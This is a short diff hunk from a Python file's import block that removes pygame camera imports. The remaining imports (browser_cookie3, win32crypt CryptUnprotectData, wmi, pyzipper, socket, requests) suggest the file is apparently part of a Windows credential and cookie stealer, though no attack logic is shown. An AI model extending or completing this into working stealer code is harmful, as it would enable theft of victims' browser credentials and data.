@@ -19,8 +19,6 @@ starttime = time.time()
 import re, json, psutil, random, requests, subprocess, socket, wmi, sqlite3, ntpath, threading, struct, browser_cookie3, uuid, shutil, sys, pyzipper,secrets
 from platform import platform as osshit
 from win32crypt import CryptUnprotectData
-import pygame
-import pygame.camera
 from shutil import copy2
 from tkinter import messagebox
 from datetime import datetime
